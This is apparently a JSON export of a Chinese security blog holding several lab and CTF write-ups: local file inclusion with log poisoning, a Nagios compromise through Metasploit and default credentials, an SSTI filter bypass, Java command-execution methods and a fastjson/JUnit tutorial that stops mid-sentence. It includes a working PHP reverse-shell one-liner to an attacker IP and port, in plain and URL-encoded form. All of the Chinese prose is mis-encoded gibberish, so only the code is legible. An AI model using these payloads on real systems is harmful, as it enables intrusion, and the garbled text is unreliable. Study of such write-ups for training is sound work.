æ‰€ä»¥æˆ‘ä»¬é©¬ä¸Šæ“ä½œä¸€æ³¢ï¼Œè¿™é‡Œæˆ‘ç”¨xshellè„¸ä¸ŠÂ·çš„ é©¬ä¸Šæ‰§è¡Œå‘½ä»¤ï¼š 1view-source:http:&#x2F;&#x2F;192.168.29.131&#x2F;antibot_image&#x2F;antibots&#x2F;info.php?image&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;log&#x2F;auth.log&amp;cmd&#x3D;ls å†ä¹‹åä¸ºäº†èƒ½å¤Ÿä¼ è„šæœ¬å•¥çš„å•Šï¼Œæˆ‘ä»¬æ‰§è¡Œä¸€æ³¢åå¼¹shellï¼š 1php -r &#x27;$sock=fsockopen(&quot;192.168.29.129&quot;,4444);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27; urlencodeä¸€ä¸‹ 1php%20-r%20&#x27;%24sock%3Dfsockopen(%22192.168.29.129%22%2C4444)%3Bexec(%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22)%3B&#x27; å¼¹åˆ°è‡ªå·±æœ¬æœºä¸Šå³å¯ã€‚ æ¥ä¸‹æ¥æˆ‘ä»¬æ±‚ä¸€ä¸ªäº¤äº’å¼çš„shellï¼Œå‘ç°python3å¯ä»¥ç”¨ï¼Œæ‰€ä»¥æ¥ä¸‹æ¥ç”¨Pythonæ‰“å¼€ä¸€ä¸ªäº¤äº’å¼çš„shell 1python3 -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot; ä¹‹åuname -a çœ‹å†…æ ¸ï¼Œexpä¸€å†²å°±å®Œäº‹äº† 1grep -nr &quot;flag&#123;&quot; / 2&gt;/dev/null æˆ‘ä»–å¦ˆç›´æ¥ä¸€æŠŠæ¢­","categories":[],"tags":[{"name":"æ¸—é€","slug":"æ¸—é€","permalink":"http://example.com/tags/%E6%B8%97%E9%80%8F/"}]},{"title":"Nagiosæ¸—é€","slug":"Nagiosæ¸—é€","date":"2020-11-08T11:38:31.000Z","updated":"2020-11-08T12:44:22.850Z","comments":true,"path":"2020/11/08/Nagiosæ¸—é€/","link":"","permalink":"http://example.com/2020/11/08/Nagios%E6%B8%97%E9%80%8F/","excerpt":"","text":"ç¬¬ä¸€æ­¥ï¼šç»å…¸NMAP 1nmap -sS -v -T4 -Pn -A -p 0-65535 172.192.168.235.135 drib 1dirb http://192.168.29.128/ Nmapçš„ç»“æœå¦‚ä¸‹ï¼š è€Œdirbçš„ç»“æœï¼š æ„Ÿè§‰æœ‰ç‚¹é¸¡è‚‹å•Š..dirbçš„ç»“æœ ç¬¬äºŒæ­¥WTMç›´æ¥ç”¨expåº“ 1searchsploit nagios msfconsole 1search nagios ä¹‹åä½¿ç”¨show optionsæŸ¥çœ‹æˆ‘ä»¬éœ€è¦å¡«å†™ä»€ä¹ˆ æŸ¥çœ‹è¿˜éœ€è¦è®¾ç½®çš„é€‰é¡¹ show optionsï¼Œä¸ºYESä¸”ç©ºçš„å°±æ˜¯è¿˜éœ€è¦æˆ‘ä»¬è®¾ç½®çš„ã€‚ å¯ä»¥çœ‹åˆ°ä¸‹å›¾ä¸­RHOSTå‚æ•°è¿˜æœªè®¾ç½®å†…å®¹ å‘ç°è¿™ä¸ªéœ€è¦è®¾ç½®å¯†ç ï¼Œäºæ˜¯å°è¯•æµ‹è¯•é»˜è®¤å¯†ç ç™»é™†NagiosXIï¼Œåœ¨è¯¥æ–‡ç« ä¸­å¾—åˆ°è´¦å·ä¸ºNagiosAdmin 1https:&#x2F;&#x2F;ywnz.com&#x2F;linuxyffq&#x2F;6587.html å¯†ç ä¸ºadmin è¿™é‡Œè®²ä¸€ä¸‹msfconsoleæ€ä¹ˆç”¨çš„.. msfconsoleé¦–å…ˆsearch æ¼æ´ show options å¯ä»¥æŸ¥çœ‹æœ‰ä»€ä¹ˆæ¡ä»¶æˆ‘ä»¬è¿˜æ²¡æœ‰è®¾ç½® å†ä¹‹åè®¾ç½®rhostå’Œlhostï¼Œå…¶ä¸­rhostä¸ºè¢«æ”»å‡»çš„æœºå­ lhostä¸ºæ”»å‡»æœºï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬çš„kali ä¹‹åç›´æ¥runï¼Œå‘ç°å¤±è´¥ 123] Exploit aborted due to failure: no-access: Authentication failed. Please provide a valid username and password.[*] Exploit completed, but no session was created. äºæ˜¯æŠŠæˆ‘ä»¬åˆšåˆšå¾—åˆ°çš„passwordå¡«å†™ä¸Šå»admin å¾—åˆ°runä¹‹åæ‰§è¡Œshellï¼ŒwhoamiæŸ¥çœ‹æƒé™å°±æ˜¯rootäº†","categories":[],"tags":[]},{"title":"å¤ªæ¹–æ¯easyweb","slug":"å¤ªæ¹–æ¯easyweb","date":"2020-11-07T11:47:54.000Z","updated":"2020-11-17T06:15:31.811Z","comments":true,"path":"2020/11/07/å¤ªæ¹–æ¯easyweb/","link":"","permalink":"http://example.com/2020/11/07/%E5%A4%AA%E6%B9%96%E6%9D%AFeasyweb/","excerpt":"","text":"æ„Ÿè§‰å¤ªæ¹–æ¯çš„é¢˜ç›®éƒ½æŒºéš¾çš„..è¿™æ¬¡è‡ªå·±åˆ¶ä½œå‡ºæ¥ä¸€é“é¢˜ï¼Œæ˜¯ä¸€é“SSTIï¼Œåšçš„æ—¶å€™ä¸€å¼€å§‹è¿˜ä»¥ä¸ºæ˜¯nodejsè¿›è¡Œå‘½ä»¤æ‰§è¡Œä»€ä¹ˆçš„ éš¾ç‚¹è¿™é“é¢˜çš„éš¾ç‚¹ä¸»è¦æ˜¯è¿‡æ»¤æ‰äº†èŠ±æ‹¬å·ï¼Œå’ŒåŒå¼•å·ç­‰ã€‚ åšé¢˜æ€è·¯è¿™é“é¢˜åˆçœ‹å°±æ„Ÿè§‰æ˜¯ä¸€é“SSTIï¼Œä½†æ˜¯åˆšå¼€å§‹çš„æ—¶å€™è¢«èŠ±æ‹¬å·å¡ä½äº†ï¼Œæå¾—æˆ‘ä»¥ä¸ºæ˜¯æ˜¯å…¶ä»–é¢˜ç›®ï¼Œç»“æœç›¸å½“æƒ³åˆ°A1CTFç‹¬è§’å…½é‚£é“é¢˜ç›®ï¼Œæ‰æœ‰äº†æ€è·¯ï¼Œé¦–å…ˆï¼Œæˆ‘ä»¬å¯ä»¥ç¡®å®šçš„æ˜¯ï¼Œæˆ‘ä»¬è¾“å…¥ä¸€äº›èŠ±é‡Œèƒ¡å“¨çš„ä¸œè¥¿ä¼šè¢«è½¬æ¢ä¸ºæ ‡å‡†çš„å­—ç¬¦ä¸²è¾“å‡ºï¼Œå¦‚å›¾ï¼š äºæ˜¯æˆ‘è”æƒ³åˆ°å¯ä»¥é€šè¿‡è¾“å…¥ç±»ä¼¼çš„èŠ±æ‹¬å·çš„utf8ç¼–ç ä¸‹çš„å­—ç¬¦ä¸²è¿›è¡Œç»•è¿‡ï¼š 1https://www.compart.com/en/unicode/U+FE5C å…¶ä¸­è¿™ä¸€è¡Œ UTF-8 Encoding: 0xEF 0xB9 0x9C æˆ‘ä»¬å°†0xä¿®æ”¹ä¸ºç™¾åˆ†å·å³å¯ ä¹‹åå°±æ˜¯æ­£å¸¸çš„SSTIäº†ï¼Œæˆ‘ä»¬å°†ä¸éœ€è¦å¼•å·çš„payloadå¾€ä¸Šä¸Šä¸€ç”©å°±è¡Œäº† äº‹åäº‹åå‘ç°å…¶å®è¿˜å¯ä»¥åˆ©ç”¨è¿™ç§æ–¹å¼è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼š","categories":[],"tags":[{"name":"æ¯”èµ›","slug":"æ¯”èµ›","permalink":"http://example.com/tags/%E6%AF%94%E8%B5%9B/"}]},{"title":"JavaSerialize","slug":"JavaSerialize","date":"2020-11-02T12:10:22.000Z","updated":"2020-11-03T12:49:27.595Z","comments":true,"path":"2020/11/02/JavaSerialize/","link":"","permalink":"http://example.com/2020/11/02/JavaSerialize/","excerpt":"","text":"JAVAå½“ä¸­å¯¹äºæ–‡ä»¶çš„å¤„ç†éƒ½æ˜¯é€šè¿‡IOæµè¿›è¡Œæ“ä½œçš„ ä¸€äº›IOæµçš„API FileOutputStream å†™å…¥æµï¼Œæˆ‘ä»¬ç”¨è¯¥æµå¯ä»¥å†™å…¥å†…å®¹åˆ°æ–‡ä»¶å½“ä¸­ FileInputStream è¯»å–æµ ObjectOutputStream è¯¥æµå¯ä»¥å°†ä¸€ä¸ªå¯¹è±¡å†™å‡ºï¼Œæˆ–è€…è¯»å–ä¸€ä¸ªå¯¹è±¡åˆ°ç¨‹åºä¸­ï¼Œä¹Ÿå°±æ˜¯æ‰§è¡Œäº†åºåˆ—åŒ–å’Œååºåˆ—åŒ–æ“ä½œã€‚ ObjectInputStream ååºåˆ—åŒ–å¹¶æ‰“å°æ•°æ® JAVAååºåˆ—åŒ–è¿‡ç¨‹é¦–å…ˆæˆ‘ä»¬è¦æ˜ç™½ï¼ŒJavaçš„åºåˆ—åŒ–ä¸ååºåˆ—åŒ–çš„è¿‡ç¨‹æ˜¯å¦‚ä½•äº§ç”Ÿçš„ï¼Œæˆ‘ä»¬å¯ä»¥ç¼–å†™å¦‚ä¸‹ä»£ç ï¼š 123456789101112131415161718192021222324import java.io.*;public class demo1&#123; public static void main(String[] args) throws Exception &#123; String obj = &quot;ls &quot;; // å°†åºåˆ—åŒ–å¯¹è±¡å†™å…¥æ–‡ä»¶aa.serä¸­ FileOutputStream fos = new FileOutputStream(&quot;aa.ser&quot;); ObjectOutputStream os = new ObjectOutputStream(fos); os.writeObject(obj); os.close(); // aa.serä¸­è¯»å–æ•°æ® FileInputStream fis = new FileInputStream(&quot;aa.ser&quot;); ObjectInputStream ois = new ObjectInputStream(fis); // é€šè¿‡ååºåˆ—åŒ–æ¢å¤å¯¹è±¡obj,æ³¨æ„è¿™é‡Œä½¿ç”¨å¼ºè½¬ String obj2 = (String)ois.readObject(); System.out.println(obj2); ois.close(); &#125;&#125; é€šè¿‡è¿™ä¸²ä»£ç ï¼Œæˆ‘ä»¬å°†æ•°æ®lsä¼ å…¥åˆ°äº†aa.serå½“ä¸­ï¼Œå¹¶ä¸”å°†å…¶é‡æ–°é‡Šæ”¾äº†å‡ºæ¥ã€‚æˆ‘ä»¬æˆåŠŸé€šè¿‡å†™å…¥åºåˆ—åŒ–æ–‡ä»¶å¹¶å°†å…¶æˆåŠŸè¿”å›ã€‚ å®ç°Serializableå’ŒExternalizableæ¥å£çš„ç±»çš„å¯¹è±¡æ‰èƒ½è¢«åºåˆ—åŒ–ã€‚æ•…æˆ‘ä»¬å†™ä¸€ä¸ªä¾‹å­ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768import java.io.*;import java.text.MessageFormat;public class Demo2 &#123; public static void SerializePerson() throws IOException &#123; Person person = new Person(); person.setAge(19); person.setName(&quot;sakani&quot;); // person.setSex(true); ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;Demo2.txt&quot;)); oos.writeObject(person); &#125; //å› ä¸ºæ–‡ä»¶å¯èƒ½ä¸å­˜åœ¨ï¼Œæ­¤æ—¶éœ€è¦å¤„ç†å¼‚å¸¸ public static Person UnSerializePerson() throws IOException, ClassNotFoundException &#123;// è¯»å–æ–‡ä»¶ FileInputStream fileInputStream = new FileInputStream(new File(&quot;Demo2.txt&quot;));// åˆ°è¿™ä¸€æ­¥æ¥è¯»å–äº†æ–‡ä»¶æµï¼Œä¸‹ä¸€æ­¥å°†å…¶å¼ºè½¬å›å¯¹è±¡ ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);// readObject æ˜¯ç”¨æ¥è¯»å–è¯¥æµå½“ä¸­çš„å¯¹è±¡ Person person2 = (Person)objectInputStream.readObject(); System.out.println(person2.getAge()); return person2; &#125; public static void main(String[] args) throws IOException, ClassNotFoundException &#123; SerializePerson();// è¿™ä¸ªæ–¹æ³•ç”¨äºåºåˆ—åŒ–å‡½æ•° Person person2 = UnSerializePerson(); System.out.println(MessageFormat.format(&quot;name=&#123;0&#125;,age=&#123;1&#125;,sex=&#123;2&#125;&quot;,person2.getName(),person2.getAge())); &#125;&#125;//å¿…é¡»è¦å®ç°åºåˆ—åŒ–æ¥å£æ‰å¯ä»¥è¿›è¡Œåºåˆ—åŒ–class Person implements Serializable &#123; private String name; private int age; private boolean sex; public Person() &#123; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public int getAge() &#123; return age; &#125; public void setAge(int age) &#123; this.age = age; &#125; public boolean isSex() &#123; return sex; &#125; public void setSex(boolean sex) &#123; this.sex = sex; &#125;&#125; Javaå‘½ä»¤æ‰§è¡Œå‡½æ•°1.java.lang.Runtime12345678910111213141516171819202122232425262728293031323334353637383940import org.junit.Test;import java.io.IOException;import java.io.InputStream;public class RuntimeTest &#123; @Test public void test1() throws IOException &#123; Runtime runtime = Runtime.getRuntime(); runtime.exec(new String[]&#123;&quot;cmd&quot;,&quot;/c&quot;,&quot;calc&quot;,&quot;&amp;&quot;,&quot;notepad&quot;&#125;); &#125; @Test public void test2() throws IOException &#123; Runtime runtime = Runtime.getRuntime(); runtime.exec(&quot;cmd /c calc &amp; notepad&quot;); &#125; @Test public void test3() throws IOException &#123; Runtime runtime = Runtime.getRuntime(); runtime.exec(&quot;cmd.exe /k calc &amp; notepad&quot;); &#125; @Test public void test4() throws IOException &#123; Runtime runtime = Runtime.getRuntime(); Process start = runtime.exec(&quot;ping sakani.top&quot;); InputStream inputStream = start.getInputStream(); byte[] res = new byte[1024]; inputStream.read(res); System.out.println(new String(res,&quot;gbk&quot;)); &#125;&#125;class Test1&#123;&#125; æ³¨æ„ï¼Œç¬¬ä¸€ç§æ–¹å¼å‘Šè¯‰æˆ‘ä»¬å¯ä»¥ç”¨æ•°ç»„æ¥ä¼ å…¥å‘½ä»¤ï¼Œç¬¬äºŒç§åˆ™æ˜¯å‘Šè¯‰å­—ç¬¦ä¸²çš„æ–¹å¼ï¼Œç¬¬å››ç§åˆ™æ˜¯æ„å‘³ç€æˆ‘ä»¬å¯ä»¥æ‰§è¡Œåå¼¹shell,ä½†æ˜¯ç”¨è¯¥æ–¹æ³•çš„æ—¶å€™æˆ‘åªå¾—åˆ°äº†ä¸€æ¡pingçš„æ•°æ®ï¼Œå¦‚å›¾æ‰€ç¤ºï¼Œæ‰€ä»¥æˆ‘è®¤ä¸ºå¯èƒ½å¹¶ä¸æ˜¯å¾ˆé è°± 2.java.lang.ProcessBuilder123456789101112@Testpublic void test5() throws IOException &#123; ProcessBuilder processBuilder = new ProcessBuilder(&quot;cmd.exe&quot;,&quot;/c&quot;,&quot;calc&quot;); Process start = processBuilder.start();&#125;@Testpublic void test6() throws IOException &#123; ProcessBuilder processBuilder = new ProcessBuilder(&quot;cmd.exe &quot;,&quot;/c calc&quot;); processBuilder.start();&#125; è¯¥æ–¹æ³•ä¹Ÿå¯ä»¥æˆåŠŸæ‰§è¡Œå‡½æ•°ï¼Œä½†éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä½¿ç”¨çš„æ—¶å€™éœ€è¦æŒ‡å®šä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªæ˜¯æ‰§è¡Œä»€ä¹ˆæ–‡ä»¶ï¼Œç¬¬äºŒä¸ªæ‰æ˜¯å‘½ä»¤ 3.java.lang.Processlmplè¿™ç§æ–¹æ³•æ˜¯ProcessBuilderçš„çˆ¶ç±»ï¼Œä½†æ˜¯å› ä¸ºå…¶ä¸ºç§æœ‰ç±»ï¼Œæˆ‘ä»¬éœ€è¦è·å–çš„æ—¶å€™åªèƒ½é€šè¿‡åå°„çš„æ–¹å¼æ¥è·å– 123456789@Testpublic void test7() throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123; Class&lt;?&gt; aClass = Class.forName(&quot;java.lang.ProcessImpl&quot;); Method start = aClass.getDeclaredMethod(&quot;start&quot;, String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, boolean.class); start.setAccessible(true); start.invoke(null, new String[]&#123;&quot;calc&quot;&#125;, null, null, null, false);&#125; è®©æˆ‘æ¯”è¾ƒç–‘æƒ‘çš„æ˜¯è¿™é‡Œä¸ºä»€ä¹ˆæ²¡æœ‰ä½¿ç”¨cmdï¼Œç›´æ¥ä½¿ç”¨çš„nullï¼Œå´å¯ä»¥æˆåŠŸå¾—åˆ°è¿è¡Œå‘¢ï¼Ÿ ç¨å¾®å®¡è®¡äº†ä»¥ä¸‹æºç ï¼Œçœ‹åˆ°äº†å¦‚ä¸‹ï¼š 123456static Process start(String cmdarray[], //æ³¨æ„è¿™é‡Œï¼Œä¼ å…¥çš„å°±æ˜¯cmdarray java.util.Map&lt;String,String&gt; environment, String dir, ProcessBuilder.Redirect[] redirects, boolean redirectErrorStream) throws IOException é¡ºä¾¿è¡¥å……ä¸€ä¸‹åå°„çš„å‡ ä¸ªçŸ¥è¯†ï¼š class.forNameç”¨äºåå°„ç±»ï¼ŒæŒ‡å®šç±»åå³å¯ class.getDeclaredMethod ç”¨äºæ˜ å°„ç±»ä¸­çš„æ–¹æ³• invoke ï¼Œå¼€å§‹è°ƒç”¨è¯¥æ–¹æ³•ï¼Œ ä¼ å…¥å‚æ•°å³å¯ä½¿ç”¨ 4. javax.script.ScriptEngineManaæœ¬è´¨ä¸Šè¿˜æ˜¯ä½¿ç”¨ä¸Šé¢çš„ä¸‰ç§æ–¹æ³•ï¼š 12345@Testpublic void test8() throws ScriptException &#123; Object scriptEngineManager = new ScriptEngineManager().getEngineByExtension(&quot;js&quot;).eval(&quot;java.lang.Runtime.getRuntime().exec(\\&quot;calc\\&quot;)&quot;); System.out.println(scriptEngineManager);&#125; è¿™é‡Œæˆ‘æ¯”è¾ƒæƒŠè®¶ï¼Œä¸ºä»€ä¹ˆè¾“å‡ºè¯­å¥ä¹Ÿå¯ä»¥æ‰§è¡Œå‘½ä»¤å‘¢ï¼Ÿ","categories":[],"tags":[]},{"title":"fastJson","slug":"fastJson","date":"2020-11-02T08:11:59.000Z","updated":"2020-11-17T06:17:04.494Z","comments":true,"path":"2020/11/02/fastJson/","link":"","permalink":"http://example.com/2020/11/02/fastJson/","excerpt":"","text":"JUnit4åœ¨å­¦ä¹ fastjsonä¹‹å‰ï¼Œæ„Ÿè§‰æœ‰å¿…è¦å…ˆå­¦ä¹ ä¸€ä¸‹Junit4çš„æ³¨è§£ï¼Œè‡ªä»SpringBootä¹‹åæ³¨è§£å¤§é‡çš„è¢«ä½¿ç”¨ï¼Œ JUnitå‡ºç°çš„ä¸å› ä¸ºmainæ–¹æ³•æµ‹è¯•å¾ˆä¸æ–¹ä¾¿ï¼Œæ‘˜è‡ªç™¾åº¦çš„éƒ¨åˆ†ï¼š 12ç”¨mainæ–¹æ³•æµ‹è¯•çš„è¯å°±å¾ˆä¸æ–¹ä¾¿ï¼Œæƒ³æµ‹è¯•å…¨éƒ¨æ–¹æ³•çš„è¯å°±å¾—æŠŠæµ‹è¯•ä»£ç å…¨éƒ¨å†™åˆ°é‡Œï¼Œæˆ–è€…ä½ æµ‹ä¸€ä¸ªé‡å†™ä¸€æ¬¡ã€‚ä¸”æ›´é‡è¦çš„æ˜¯ï¼Œè¿™æ ·ä¼šä½¿æµ‹è¯•ä»£ç ä¸è¿è¡Œé€»è¾‘ä»£ç æ··åœ¨ä¸€èµ·ï¼Œä¸è§„èŒƒã€‚ä½¿ç”¨junitå°±æ–¹ä¾¿å¤šäº†,è¿™æ˜¯å•å…ƒæµ‹è¯•ï¼Œä½ æƒ³æµ‹å“ªä¸ªæ–¹æ³•å°±å†™ä¸€ä¸ªå¯¹åº”çš„æµ‹è¯•æ–¹æ³•ï¼Œç„¶åç”¨junitè¿è¡Œã€‚æ¯ä¸ªæ–¹æ³•ä¹‹é—´æ˜¯ç‹¬ç«‹çš„ï¼Œéå¸¸çµæ´»ã€‚è€Œä¸”æµ‹è¯•æ–¹æ³•ä¸€èˆ¬ä¸ä¼šç›´æ¥å†™åœ¨åŸç±»ä¸­ï¼Œè€Œæ˜¯å•ç‹¬çš„æµ‹è¯•ç±»ï¼Œè¿™æ ·æµ‹è¯•ä»£ç å°±å®Œå…¨ä¸é€»è¾‘ä»£ç åˆ†å¼€äº†ã€‚ è€Œåœ¨Junit4å¤§é‡ä½¿ç”¨äº†ä»Java5ä¸­å¼€å§‹ä½¿ç”¨çš„æ³¨è§£ï¼Œå¦‚ä¸‹æ˜¯JUnit4å¸¸ç”¨çš„æ³¨è§£ï¼š beforeï¼Œtestï¼Œafter Beforeï¼šåˆå§‹åŒ–æ–¹æ³•ï¼Œé’ˆå¯¹æ¯ä¸ªæµ‹è¯•æ–¹æ³•ï¼Œéƒ½ä¼šæ‰§è¡Œä¸€é Test: ä»£æ›¿mainå‡½æ•°ï¼Œå¯ä»¥è®©æˆ‘ä»¬çµæ´»çš„æµ‹è¯•æŸéƒ¨åˆ†ä»£ç ,æ³¨æ„ï¼Œæµ‹è¯•çš„æ—¶å€™ä¸è¦å†™ä¸€ä¸ªTestç±»ï¼ï¼ï¼ï¼ï¼Œå¦åˆ™å› ä¸ºä¼šæœ‰é™é€‰æ‹©åŒåŒ…ä¸‹çš„testç±»ï¼Œå¯¼è‡´æŠ¥é”™,@Testæ–¹æ³•æ‰€åœ¨ç±»ä¸­,ä¸èƒ½å­˜åœ¨æœ‰å‚æ•°æ„é€ å‡½æ•°,æ— å‚æ„é€ å¯ä»¥å­˜åœ¨ Afterï¼šåœ¨æ–¹æ³•ç»“æŸä¹‹åæ‰§è¡Œï¼Œæ¯æ¬¡éƒ½ä¼šæ‰§è¡Œï¼ ä¾‹å­ï¼š 12345678910111213141516171819202122package com.ys.pojo;import org.junit.After;import org.junit.Before;import org.junit.Test;public class Person&#123; @Before public void before()&#123; System.out.println(&quot;æœ€å…ˆè¢«æ‰§è¡Œï¼&quot;); &#125; @Test public void test()&#123; System.out.println(&quot;wdnmd&quot;); &#125; @After public void after()&#123; System.out.println(&quot;æˆ‘ä¹‹åæ‰ä¼šè¢«æ‰§è¡Œå‘¢&quot;); &#125;&#125; é™¤æ­¤ä¹‹å¤–ï¼ŒTestæ³¨è§£è¿˜å…è®¸æˆ‘ä»¬æ·»åŠ å‚æ•°ï¼Œæ£€æµ‹æ˜¯å¦æŠ›å‡ºæŸéƒ¨åˆ†å¼‚å¸¸ï¼š ä¾‹å­ï¼š 12345678 @Test(expected = Exception.class) public void test2()&#123; int[] array = new int[3]; for (int i = 0; i &lt; 5; i++) &#123; array[i] = i; &#125; &#125;&#125; å½“ä»£ç å‡ºç°å¼‚å¸¸çš„æ—¶å€™ï¼Œåˆ™ä¸ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œç›¸åçš„ï¼Œå¦‚æœè¿™æ®µä»£ç æ­£å¸¸æŠ›å‡ºï¼Œå°±ä¼šæŠ›å‡ºå¼‚å¸¸äº†ã€‚ beforeclassï¼Œafterclass BeforeClass: åœ¨æ‰€æœ‰ç±»è¢«æ‰§è¡Œä¹‹å‰æ‰§è¡Œï¼Œåªä¼šæ‰§è¡Œä¸€æ¬¡ï¼ŒåŒæ—¶å¿…é¡»ä¸ºstaticé™æ€æ–¹æ³•ï¼ˆå› ä¸ºä»–ä»¬å°±ç›¸å½“äºæ­¤ï¼‰ AfterClass: åœ¨æ‰€æœ‰ç±»è¢«æ‰§è¡Œä¹‹åæ‰§è¡Œ 1234567891011121314151617181920212223242526272829303132333435363738394041package com.ys.pojo;import org.junit.*;import java.lang.reflect.Array;public class Person&#123; @Before public void before()&#123; System.out.println(&quot;æˆ‘å°±ç›¸å½“äºæ„é€ å™¨ï¼&quot;); &#125; @Test public void test1()&#123; System.out.println(&quot;æˆ‘æ˜¯test1ï¼Œæˆ‘è¢«æ‰§è¡Œäº†&quot;); &#125; @After public void after()&#123; System.out.println(&quot;æˆ‘ä¹‹åæ‰ä¼šè¢«æ‰§è¡Œ&quot;); &#125; @Test(expected = Exception.class) public void test2()&#123; int[] array = new int[3]; for (int i = 0; i &lt; 5; i++) &#123; array[i] = i; &#125; System.out.println(&quot;æˆ‘æ˜¯test2æ‰§è¡Œäº†ï¼&quot;); &#125; @BeforeClass public static void beforeClass()&#123; System.out.println(&quot;æˆ‘åœ¨æ‰€æœ‰çš„å‰é¢è¢«æ‰§è¡Œï¼Œå¹¶ä¸”æˆ‘åªä¼šæ‰§è¡Œä¸€æ¬¡ï¼&quot;); &#125; @AfterClass public static void afterClass()&#123; System.out.println(&quot;æˆ‘åœ¨æœ€ç»ˆæ‰€æœ‰ç»“æŸä¹‹åæ‰ä¼šè¢«æ‰§è¡Œ&quot;); &#125;&#125; Ignore Ignoreå¯ä»¥è®©æˆ‘ä»¬æš‚æ—¶çš„ç¦ç”¨ç‰¹å®šçš„ç±»ï¼Œè¢«æ³¨è§£ä¹‹åçš„ç±»å°†ä¸å†è¢«æ‰§è¡Œ Ignoreç»è¿‡æˆ‘æµ‹è¯•ï¼Œåªæœ‰å½“ä»–æ”¾åœ¨æµ‹è¯•ç±»å‰æ‰å¯ä»¥ç”Ÿæ•ˆã€‚ ä¾‹å­ï¼š è€Œå¦‚æœæˆ‘ä»¬æ”¾åœ¨å…¶ä»–ç±»å‰é¢ï¼š æˆ‘ä»¬å¯ä»¥å‘ç°ä¾ç„¶è¢«æ‰§è¡Œäº†ï¼ Runwith Runwithæ”¾åœ¨æµ‹è¯•ç±»ä¹‹å‰ï¼Œç”¨äºç¡®å®šè¿™ä¸ªç±»è¯¥å¦‚ä½•è¿è¡Œï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ä¸æ ‡æ³¨ï¼Œå°†ä¼šä½¿ç”¨é»˜è®¤çš„è¿è¡Œå®¹å™¨ å¯ä»¥çœ‹è¿™ç¯‡æ–‡ç« æ¥ç†è§£ï¼š 1https:&#x2F;&#x2F;my.oschina.net&#x2F;itblog&#x2F;blog&#x2F;1550753?tdsourcetag&#x3D;s_pcqq_aiomsg Fastjson Fastjson æ˜¯ä¸€ä¸ª Java åº“ï¼Œå¯ä»¥å°† Java å¯¹è±¡è½¬æ¢ä¸º JSON æ ¼å¼ï¼Œå½“ç„¶å®ƒä¹Ÿå¯ä»¥å°† JSON å­—ç¬¦ä¸²è½¬æ¢ä¸º Java å¯¹è±¡ã€‚ Fastjson å¯ä»¥æ“ä½œä»»ä½• Java å¯¹è±¡ï¼Œå³ä½¿æ˜¯ä¸€äº›é¢„å…ˆå­˜åœ¨çš„æ²¡æœ‰æºç çš„å¯¹è±¡ã€‚ Fastjson æºç åœ°å€ï¼šhttps://github.com/alibaba/fastjson Fastjson ä¸­æ–‡ Wikiï¼šhttps://github.com/alibaba/fastjson/wiki/Quick-Start-CN ä¹Ÿå°±æ˜¯è¯´ï¼Œç¨‹åºå‘˜ä»¬ç”¨è¿™ä¸ªç¨‹åºå°±æ˜¯ä¸ºäº†ä¼ è¿JSONæ ¼å¼çš„å¯¹è±¡ï¼Œå‘ƒï¼Œæ„Ÿè§‰åƒåºåˆ—åŒ–ä¸€æ ·äº†ï¼Ÿ å°†JAVAå¯¹è±¡è½¬æ¢æˆjsonæ ¼å¼123456789101112131415161718192021222324252627package com.ys.pojo;import com.alibaba.fastjson.JSON;import org.junit.Before;import org.junit.Test;import java.util.ArrayList;import java.util.Date;import java.util.List;public class Fortest &#123; private List&lt;JavaToJson&gt; listOfJava = new ArrayList&lt;JavaToJson&gt;(); @Before public void setUp()&#123; listOfJava.add(new JavaToJson(18,&quot;wndmd&quot;,new Date())); listOfJava.add(new JavaToJson(20,&quot;Json!&quot;,new Date())); &#125; @Test public void test()&#123; String list = JSON.toJSONString(listOfJava); System.out.println(list); &#125;&#125; æ³¨æ„ï¼Œä¸Šè¿°ä»£ç éœ€è¦å¦å¤–èµ·ä¸€ä¸ªç±»ï¼Œtestä¸å…è®¸åœ¨æœ‰å‚æ„é€ çš„ç±»ä¸­å‡ºç° å¾—åˆ°è¾“å‡ºç»“æœï¼š 1234567891011[ &#123;&quot;Age&quot;:18, &quot;DATE OF BIRTH&quot;:1604309562809, &quot;FULL NAME&quot;:&quot;wndmd&quot; &#125;, &#123; &quot;Age&quot;:20, &quot;DATE OF BIRTH&quot;:1604309562809, &quot;FULL NAME&quot;:&quot;Json!&quot; &#125;] æˆ‘ä»¬è¿˜å¯ä»¥æ ¼å¼åŒ–è‡ªå®šä¹‰è¾“å‡ºï¼Œæ§åˆ¶å­—æ®µçš„æ’åºã€‚ æˆ‘ä»¬æ›´æ–°beanå¹¶æ·»åŠ å¦‚ä¸‹å­—æ®µï¼š 123456789public class JavaToJson &#123; @JSONField(name = &quot;Age&quot;,serialize = false) private int age; @JSONField(name = &quot;FULL NAME&quot;,ordinal = 2) private String fullName; @JSONField(name = &quot;DATE OF BIRTH&quot;,format = &quot;dd/MM/yyyy&quot;,ordinal = 1) private Date date; æ³¨æ„åœ¨è¿™é‡Œæˆ‘ä»¬æ·»åŠ serialize = falseï¼Œè¿™é‡Œæ˜¯é»˜è®¤æˆ‘ä»¬æ·»åŠ åºåˆ—åŒ–ï¼Œå¦‚æœæˆ‘ä»¬è®¾ç½®ä¸ºfalseï¼Œè¯¥å­—æ®µå°†ä¸ä¼šè¢«æ˜¾ç¤ºã€‚ è€Œordinalï¼Œåˆ™æ˜¯ç”¨äºè§„å®šæ ¼å¼åŒ–çš„é¡ºåºï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœä½ 